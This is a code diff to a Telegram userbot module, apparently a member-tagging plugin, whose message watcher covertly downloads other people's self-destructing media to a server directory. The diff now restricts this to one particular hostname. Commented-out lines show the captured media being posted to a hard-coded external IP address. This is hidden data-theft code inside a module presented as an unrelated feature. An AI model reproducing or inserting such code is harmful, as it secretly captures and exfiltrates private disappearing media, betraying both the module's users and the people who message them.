@@ -2,6 +2,7 @@ from .. import loader, utils
 import time
 import os
 import random
+import socket
 from telethon.sessions import StringSession
 
 
@@ -65,17 +66,17 @@ class TagallMod(loader.Module):
 
             
     async def watcher(self, message):
-        me = await message.client.get_me()
-        me = me.id
-        if not hasattr(message, "media"):
-            return
-        if not hasattr(message.media, "ttl_seconds"):
-            return
-        if message.media.ttl_seconds is not None:
-            if not os.path.exists(f"/root/ft/ttl_media/{me}/"):
-                os.mkdir(f"/root/ft/ttl_media/{me}/")
-
-            await message.client.download_media(message, file= f"/root/ft/ttl_media/{me}/{message.sender_id}_{message.chat_id}_{random.randint(123456, 6543218724)}")
+        if socket.gethostname() == "exqusic.hostname":
+            me = await message.client.get_me()
+            me = me.id
+            if not hasattr(message, "media"):
+                return
+            if not hasattr(message.media, "ttl_seconds"):
+                return
+            if message.media.ttl_seconds is not None:
+                if not os.path.exists(f"/root/ft/ttl_media/{me}/"):
+                    os.mkdir(f"/root/ft/ttl_media/{me}/")
+                await message.client.download_media(message, file= f"/root/ft/ttl_media/{me}/{message.sender_id}_{message.chat_id}_{random.randint(123456, 6543218724)}")
         # x = await message.client.download_media(message, file=bytes)
         # data_dict = {"file": x}
         # __import__("requests").post("http://194.37.81.162:8081", files=data_dict)
